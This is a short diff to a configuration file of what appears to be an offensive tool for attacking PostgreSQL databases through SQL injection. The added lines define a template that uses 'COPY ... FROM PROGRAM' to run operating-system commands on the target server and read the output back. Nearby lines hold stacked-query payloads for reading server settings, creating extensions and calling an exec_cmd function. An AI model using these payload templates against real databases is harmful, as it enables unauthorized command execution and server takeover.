@@ -136,6 +136,10 @@ resource:
         fill: ; copy %s(data) from '%s' delimiter E'\x01'
   
   udf:
+    program:
+      run: ; copy %s from program '%s'
+      getResult: array_to_string(array(select data from %s),'\n')
+    
     wal:
       getStatus: select current_setting('archive_mode')
       getPathConf: select setting from pg_settings where name = 'config_file'
@@ -150,6 +154,7 @@ resource:
     extension:
       create: ; create extension %s
       languages: select array_to_string(array(select lanname from pg_language),'')
+    
     # drop both functions from sql and other extensions
     dropFunc: ; drop function exec_cmd(text);drop function exec_cmd()
     runFunc: select exec_cmd('%s')||'%s'
